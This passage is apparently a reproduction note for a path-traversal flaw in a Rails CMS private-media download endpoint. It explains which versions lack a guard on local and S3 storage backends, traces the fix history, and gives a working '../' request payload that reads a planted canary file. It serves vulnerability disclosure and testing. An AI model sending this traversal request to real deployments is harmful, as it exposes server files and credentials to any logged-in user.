+ mkdir Rails.root/private (on-disk private-media dir) + `rails server`.

================================================================================
MECHANISM
================================================================================
Endpoint (auth: cama_authenticate only -> ANY logged-in user, incl low-priv 'client';
NO authorize! :manage on 2.8.x):
  GET /admin/media/download_private_file?file=<payload>
Controller: cama_uploader.enable_private_mode!; file = cama_uploader.fetch_file("private/#{params[:file]}");
            send_file file
cama_uploader chosen by site option filesystem_type: 'local' => LocalUploader, 's3' => AwsUploader.

LocalUploader#fetch_file:  2.8.0 no guard  ->  2.8.1 `return {error} if file_name.include?('..')`  (CVE-2024-46987 fix)
AwsUploader#fetch_file  (inherits file_exists? = File.exist?):
     return file_name if file_exists?(file_name)   # File.exist? = LOCAL fs, resolves ../ under Rails.root
     ...
   2.8.1 & 2.9.1 NO guard (S3 deployments still traversable = CVE-2026-1776 residual of the incomplete fix)
   2.9.2 `return {error} unless valid_folder_path?(file_name)`  (PR #1127 / commit f54a77e)
   (2.9.2 also adds controller verify_media_authorization + sanitize_private_filename! as defense-in-depth.)

The `../` traversal reads a LOCAL file via File.exist?+send_file; the S3 backend just routes to the
unguarded AwsUploader. Payload escapes /build/app/private up to '/', reading the planted canary
/pcb_flag.txt (benign stand-in for the advisory's /etc/passwd).

Same payload string for both surfaces (only the storage BACKEND differs):
  file=../../../../../../pcb_flag.txt

